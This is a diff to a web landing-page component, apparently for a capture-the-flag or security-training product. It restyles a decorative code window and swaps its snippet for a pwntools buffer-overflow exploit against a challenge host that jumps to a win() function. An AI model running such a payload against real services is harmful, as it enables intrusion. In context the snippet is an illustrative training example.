@@ -2,12 +2,12 @@
 import { Card } from "@/components/ui/card";
 ---
 
-<section class="py-24 px-6 bg-background relative z-10 overflow-hidden">
-    <div class="max-w-7xl mx-auto grid lg:grid-cols-2 gap-16 items-center">
+<section class="py-24 px-6 relative z-10 overflow-hidden">
+    <div class="max-w-7xl mx-auto grid lg:grid-cols-2 gap-16 items-center relative z-10">
         
         {/* Problem Section */}
         <div class="space-y-8 relative z-20">
-            <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-red-500/10 text-red-500 text-xs font-medium uppercase tracking-wider border border-red-500/20">
+            <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-red-500/10 text-red-500 text-xs font-medium uppercase tracking-wider border border-red-500/20 backdrop-blur-sm">
                 The Problem
             </div>
             <h2 class="text-3xl md:text-4xl lg:text-5xl font-bold tracking-tight text-foreground">
@@ -21,35 +21,57 @@ import { Card } from "@/components/ui/card";
         {/* Code Snippet Visual */}
         <div class="relative group perspective-1000">
             {/* Glow effect behind the code window */}
-            <div class="absolute -inset-4 bg-gradient-to-r from-accent/30 to-purple-500/30 rounded-[2rem] blur-2xl opacity-50 group-hover:opacity-70 transition-opacity duration-700"></div>
+            <div class="absolute -inset-8 bg-gradient-to-r from-accent/20 to-purple-500/20 rounded-[3rem] blur-3xl opacity-40 group-hover:opacity-60 transition-opacity duration-1000 ease-out"></div>
             
-            <Card className="relative bg-[#1e1e1e] border-none shadow-2xl rounded-xl overflow-hidden transform transition-transform duration-500 hover:scale-[1.01] hover:rotate-1 ring-1 ring-white/10">
+            <Card className="relative bg-[#1e1e1e] border-none shadow-2xl rounded-xl overflow-hidden transform transition-all duration-700 ease-[cubic-bezier(0.25,0.1,0.25,1)] hover:scale-[1.02] hover:rotate-1 ring-1 ring-white/10">
                 {/* Window Controls */}
                 <div class="flex items-center gap-2 px-4 py-3 bg-[#252526] border-b border-white/5">
                     <div class="w-3 h-3 rounded-full bg-[#ff5f56]"></div>
                     <div class="w-3 h-3 rounded-full bg-[#ffbd2e]"></div>
                     <div class="w-3 h-3 rounded-full bg-[#27c93f]"></div>
-                    <div class="ml-auto text-[10px] text-white/30 font-mono">solver.py</div>
+                    <div class="ml-auto text-[10px] text-white/30 font-mono">exploit.py</div>
                 </div>
                 
                 {/* Code Content */}
-                <div class="p-6 overflow-x-auto">
+                <div class="p-6 overflow-x-auto custom-scrollbar">
                     <pre class="font-mono text-sm leading-relaxed">
 <span class="text-[#c586c0]">import</span> <span class="text-[#9cdcfe]">socket</span>
 <span class="text-[#c586c0]">from</span> <span class="text-[#9cdcfe]">pwn</span> <span class="text-[#c586c0]">import</span> <span class="text-[#dcdcaa]">*</span>
 
-<span class="text-[#6a9955]"># Connect to challenge</span>
-<span class="text-[#9cdcfe]">target</span> = <span class="text-[#dcdcaa]">remote</span>(<span class="text-[#ce9178]">'ctf.gooseberry.com'</span>, <span class="text-[#b5cea8]">1337</span>)
+<span class="text-[#6a9955]"># Target connection</span>
+<span class="text-[#9cdcfe]">HOST</span> = <span class="text-[#ce9178]">'challenge.local'</span>
+<span class="text-[#9cdcfe]">PORT</span> = <span class="text-[#b5cea8]">1337</span>
 
-<span class="text-[#6a9955]"># Craft payload for buffer overflow</span>
-<span class="text-[#9cdcfe]">offset</span> = <span class="text-[#b5cea8]">64</span>
-<span class="text-[#9cdcfe]">payload</span> = <span class="text-[#ce9178]">b'A'</span> * <span class="text-[#9cdcfe]">offset</span>
-<span class="text-[#9cdcfe]">payload</span> += <span class="text-[#dcdcaa]">p64</span>(<span class="text-[#b5cea8]">0x401176</span>) <span class="text-[#6a9955]"># Ret to win() function</span>
+<span class="text-[#c586c0]">def</span> <span class="text-[#dcdcaa]">exploit</span>():
+    <span class="text-[#9cdcfe]">r</span> = <span class="text-[#dcdcaa]">remote</span>(<span class="text-[#9cdcfe]">HOST</span>, <span class="text-[#9cdcfe]">PORT</span>)
+    
+    <span class="text-[#6a9955]"># Craft payload for buffer overflow</span>
+    <span class="text-[#9cdcfe]">payload</span> = <span class="text-[#ce9178]">b'A'</span> * <span class="text-[#b5cea8]">72</span>
+    <span class="text-[#9cdcfe]">payload</span> += <span class="text-[#dcdcaa]">p64</span>(<span class="text-[#b5cea8]">0x401196</span>) <span class="text-[#6a9955]"># win()</span>
 
-<span class="text-[#9cdcfe]">target</span>.<span class="text-[#dcdcaa]">sendline</span>(<span class="text-[#9cdcfe]">payload</span>)
-<span class="text-[#9cdcfe]">target</span>.<span class="text-[#dcdcaa]">interactive</span>()</pre>
+    <span class="text-[#9cdcfe]">r</span>.<span class="text-[#dcdcaa]">sendlineafter</span>(<span class="text-[#ce9178]">b'&gt; '</span>, <span class="text-[#9cdcfe]">payload</span>)
+    <span class="text-[#9cdcfe]">r</span>.<span class="text-[#dcdcaa]">interactive</span>()
+
+<span class="text-[#c586c0]">if</span> <span class="text-[#9cdcfe]">__name__</span> == <span class="text-[#ce9178]">'__main__'</span>:
+    <span class="text-[#dcdcaa]">exploit</span>()</pre>
                 </div>
             </Card>
         </div>
     </div>
 </section>
+
+<style>
+    .custom-scrollbar::-webkit-scrollbar {
+        height: 8px;
+    }
+    .custom-scrollbar::-webkit-scrollbar-track {
+        background: #1e1e1e;
+    }
+    .custom-scrollbar::-webkit-scrollbar-thumb {
+        background: #424242;
+        border-radius: 4px;
+    }
+    .custom-scrollbar::-webkit-scrollbar-thumb:hover {
+        background: #4f4f4f;
+    }
+</style>
